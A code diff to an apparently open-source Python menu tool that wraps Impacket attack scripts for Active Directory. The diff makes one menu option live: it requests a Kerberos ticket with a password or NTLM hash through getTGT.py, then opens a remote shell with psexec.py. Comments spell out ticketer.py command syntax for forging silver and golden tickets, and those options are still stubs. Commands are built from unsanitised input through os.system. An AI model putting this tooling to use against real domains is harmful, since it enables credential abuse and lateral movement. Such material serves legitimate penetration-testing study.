@@ -86,7 +86,7 @@ def gettime(value):
    return variable
 
 def command(command):
-#   print colored("Using Command: " + command + "\n", 'white')
+   print colored("Using Command: " + command + "\n", 'white')
    os.system(command)
    raw_input("\nPress ENTER to continue...")
    return
@@ -1259,45 +1259,59 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
+# Details :                        getTGT.py DOMAIN/USER -hashes :HASH
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '46':
-      exit(1)
+      if PAS[:1] != "\"":
+         os.system(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
+         os.system("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+      else:
+         if FRST[:1] != "":
+            os.system(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + FRST)
+            os.system("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+         else:
+            os.command("echo 'User password or hash required...'")  
+      if os.path.exists(USR.rstrip(" ") + ".ccache"):
+         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+      else:
+          command("echo 'TGT was not generated...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - Pass the Ticket.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '47':
-      exit(1)      
+      command("echo 'Pass the Ticket has not been implemented yet...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN -spn ? USER
+# Details : Silver Ticket!! 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '48':
-      exit(1)
+      command("echo 'Silver Ticket has not been implemented yet...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
+# CONTRACT: GitHub11bc5814059277a4c697f5536e27beaa
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '49':
-      exit(1)
+      command("echo 'Golden Ticket has not been implemented yet...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
